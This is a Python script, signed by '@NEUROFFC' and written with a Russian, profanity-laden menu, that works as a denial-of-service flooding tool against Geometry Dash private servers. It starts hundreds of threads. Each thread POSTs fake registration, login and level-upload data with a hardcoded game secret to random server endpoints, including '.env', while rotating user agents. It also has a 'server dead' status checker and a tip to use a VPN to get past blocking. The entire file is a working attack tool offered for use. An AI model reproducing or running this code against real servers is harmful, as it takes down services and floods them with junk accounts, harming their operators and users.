# BY @NEUROFFC

import requests as rq
import threading as th
import random as rn
import time as tm
import os
from datetime import datetime as dt

tgt = ""
lf = None
st = {"snt": 0, "err": 0, "ok": 0}
lk = th.Lock()
tc = 500
rnb = False

eps = [
    "", "accounts/registerGJAccount.php", "accounts/loginGJAccount.php",
    "uploadGJLevel.php", "getGJLevels.php", "downloadGJLevel.php",
    "getGJScores.php", "getGJComments.php", "uploadGJComment.php",
    "getGJUsers.php", "updateGJUserScore.php", "dashboard/",
    "dashboard/index.php", "config/", ".env",
]

uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "",
]

def lg(msg):
    t = dt.now().strftime("%H:%M:%S")
    line = f"[{t}] {msg}"
    print(line, flush=True)
    if lf:
        lf.write(line + "\n")

def gk(url):
    try:
        r = rq.get(url, timeout=8)
        t = r.text.lower()
        if "gdps created" in t or "go to the dashboard" in t:
            return "доступен"
        elif "unknown gdps" in t or "not assigned" in t:
            return "удален/снесен"
        elif r.status_code == 403:
            return "доступен (403)"
        elif r.status_code == 200:
            return "доступен"
        return f"код {r.status_code}"
    except:
        return "сервер мертв"

def af(tid):
    global st
    s = rq.Session()
    
    while rnb:
        try:
            ep = rn.choice(eps)
            url = tgt + ep
            ua = rn.choice(uas)
            s.headers.update({"User-Agent": ua, "Accept": "*/*", "Connection": "keep-alive"})
            
            d = {
                "userName": str(rn.randint(1,999999)),
                "password": str(rn.randint(1,999999)),
                "email": f"{rn.randint(1,999999)}@gmail.com",
                "secret": "Wmfd2893gb7",
                "levelID": str(rn.randint(1,999999)),
                "accountID": str(rn.randint(1,999999)),
            }
            
            r = s.post(url, data=d, timeout=3)
            
            with lk:
                st["snt"] += 1
                if r.status_code > 0:
                    st["ok"] += 1
                else:
                    st["err"] += 1
                
                if st["snt"] % 1000 == 0:
                    lg(f"отправлено: {st['snt']} | успешно: {st['ok']} | ошибки: {st['err']} | статус: {r.status_code}")
                
        except:
            with lk:
                st["snt"] += 1
                st["err"] += 1
                
                if st["snt"] % 1000 == 0:
                    lg(f"отправлено: {st['snt']} | успешно: {st['ok']} | ошибки: {st['err']} | статус: ошибка")

def sf():
    global rnb, lf, st, tgt
    if rnb:
        print("атака уже идет")
        tm.sleep(1)
        return
    
    os.system("cls" if os.name == "nt" else "clear")
    
    url = input("ссылка на сервер: ").strip()
    if not url.startswith("http"):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    
    tgt = url
    st = {"snt": 0, "err": 0, "ok": 0}
    rnb = True
    
    lf = open("ddos_log.txt", "w", encoding="utf-8", buffering=1)
    
    lg("!=== АРБУЗНЫЙ ЕБАКА ДДОС 1000 ЛВЛ ЗАПУЩЕН @NEUROFFC==!")
    lg(f"цель: {tgt}")
    lg(f"потоков: {tc}")
    lg("начало атаки...")
    
    for i in range(tc):
        th.Thread(target=af, args=(i,), daemon=True).start()
    
    print(f"\nебака запущена на {tgt} с {tc} потоками")
    print("нажми CTRL+C чтобы остановить\n")
    
    try:
        while rnb:
            tm.sleep(5)
    except KeyboardInterrupt:
        rnb = False
        lg(f"\nебака остановлена. всего запросов: {st['snt']} | успешно: {st['ok']} | ошибки: {st['err']}")
        if lf:
            lf.close()
        tm.sleep(1)

def gf():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"ссылка: {tgt}")
    print("проверка...")
    sts = gk(tgt)
    print(f"статус: {sts}")
    input("\nнажми enter для продолжения...")

def cf():
    global tc
    os.system("cls" if os.name == "nt" else "clear")
    try:
        n = int(input("кол-во потоков (сейчас {}): ".format(tc)))
        if n > 0:
            tc = n
            print(f"потоков установлено: {tc}")
        else:
            print("надо больше 0 долбаеб")
    except:
        print("число введи")
    tm.sleep(1)

while True:
    os.system("cls" if os.name == "nt" else "clear")
    print("=== BY @NEUROFFC АРБУЗНЫЙ ЕБАКА ДДОС ФХГДПС ХУЙНЯ BY @NEUROFFC ===")
    print(f"потоков: {tc}")
    if rnb:
        print(f"статус: идет атака на {tgt}")
    else:
        print("статус: ожидание")
    print("\n1 - запустить ебаку")
    print("2 - статус")
    print("3 - изменить количество потоков")
    print("4 - выход")
    if st["snt"] > 0 and st["ok"] == 0:
        print("\n!!! все запросы в ошибках - включи впн !!!")
    print()
    
    try:
        cmd = input("> ").strip()
        
        if cmd == "1":
            sf()
        elif cmd == "2":
            gf()
        elif cmd == "3":
            cf()
        elif cmd == "4":
            if rnb:
                rnb = False
                if lf:
                    lf.close()
            os.system("cls" if os.name == "nt" else "clear")
            print("выход")
            break
    except KeyboardInterrupt:
        if rnb:
            rnb = False
            if lf:
                lf.close()
        os.system("cls" if os.name == "nt" else "clear")
        print("выход")
        break